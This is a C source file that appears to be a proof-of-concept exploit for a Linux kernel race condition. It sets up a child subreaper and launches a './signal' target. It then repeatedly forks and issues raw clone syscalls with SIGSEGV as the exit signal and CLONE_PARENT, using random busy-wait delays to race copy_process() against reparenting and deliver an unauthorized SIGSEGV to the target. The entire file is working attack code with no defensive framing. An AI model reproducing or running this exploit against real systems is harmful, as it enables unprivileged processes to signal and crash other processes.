#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <asm/unistd.h>
#include <time.h>

#define SIGNAL_TARGET "./signal"
#define INITIAL_DELAY 300000
#define DELAY_STEP 1
#define DELAY_MAX 1000000

int get_random_delay()
{
    srand(time(0));
    int delay = rand() % 1000000 + INITIAL_DELAY;
    return delay;
}

int main (int argc, char **argv, char **envp) {

    if (argc == 1) {
        prctl(PR_SET_CHILD_SUBREAPER, 1,0,0,0);
        if (fork() > 0) {
            // the reparent target
            char *arg[] = {SIGNAL_TARGET, NULL};
            execve(SIGNAL_TARGET, arg, envp);
        } else { // to match exec_id
            char *arg[] = {argv[0], ".", NULL};
            execve(argv[0], arg, envp);
        }
    }
    int delay = INITIAL_DELAY;
    int j;
    for (j=0; j<100; j++) {
        delay = get_random_delay();
        if (fork() == 0) { // additional fork to brute force timing
            unsigned long flags = SIGSEGV;
            int pid = syscall(__NR_clone, flags, NULL, NULL, NULL, 0);
            if (pid != 0) {
                for(int i = 0; i < delay; ++i) { __asm__ __volatile__ ("" : "+g" (i) : :); }
                exit(0); // race copy_process() vvv
            }

            flags = CLONE_PARENT;
            pid = syscall(__NR_clone, flags, NULL, NULL, NULL, 0); // race reparent ^^^
            if (pid != 0) { // don't care this task
                exit(0);
            }

            // will deliver SIGSEGV signal by do_notify_parent if race successfully
            exit(0);
        }
    }
}
